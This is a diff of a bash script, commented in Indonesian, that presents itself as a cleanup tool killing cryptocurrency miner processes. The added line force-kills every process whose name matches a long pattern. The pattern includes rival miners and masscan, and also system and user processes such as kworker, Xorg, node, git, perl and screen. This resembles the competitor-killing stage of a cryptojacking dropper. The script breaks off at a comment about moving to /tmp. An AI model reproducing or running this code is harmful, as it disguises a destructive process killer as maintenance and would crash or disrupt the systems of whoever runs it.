@@ -1,20 +1,7 @@
 #!/bin/bash
 
 # Daftar nama proses miner yang ingin dibunuh
-miner_processes=("miner" "xmrig" "syssls" "ethminer" "cpuminer" "bminer")
-
-# Loop untuk mencari dan membunuh semua proses miner berdasarkan nama proses
-for process in "${miner_processes[@]}"; do
-  # Mencari PID dari proses miner yang cocok
-  pids=$(ps aux | grep "$process" | grep -v "grep" | awk '{print $2}')
-  
-  # Jika ada PID yang ditemukan, kill proses tersebut
-  if [ -n "$pids" ]; then
-    echo "Membunuh proses $process dengan PID: $pids"
-    kill -9 $pids
-  fi
-done
-
+ps -ef|awk '/upgrade|update|xmrig|miner|ethminer|cpuminer|bminer|syssls|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' |xargs kill -9
 echo "Semua proses miner yang ditemukan telah dibunuh."
 
 # Pindah ke direktori /tmp
